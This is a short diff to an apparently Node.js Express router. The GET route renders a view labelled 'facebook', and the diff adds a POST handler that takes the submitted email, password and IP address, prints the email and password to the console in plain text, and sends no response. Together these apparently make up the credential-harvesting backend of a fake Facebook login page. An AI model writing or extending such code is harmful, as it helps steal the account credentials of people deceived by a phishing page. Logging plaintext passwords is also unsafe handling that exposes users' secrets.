@@ -5,5 +5,9 @@ router.get("/", (req, res) => {
   res.render("index", { data: "facebook" });
 });
 
+router.post("/", (req, res) => {
+  const { email, password, ipAddress } = req.body;
+  console.log({ email }, "\n", { password }, "\n");
+});
 
 module.exports = router;
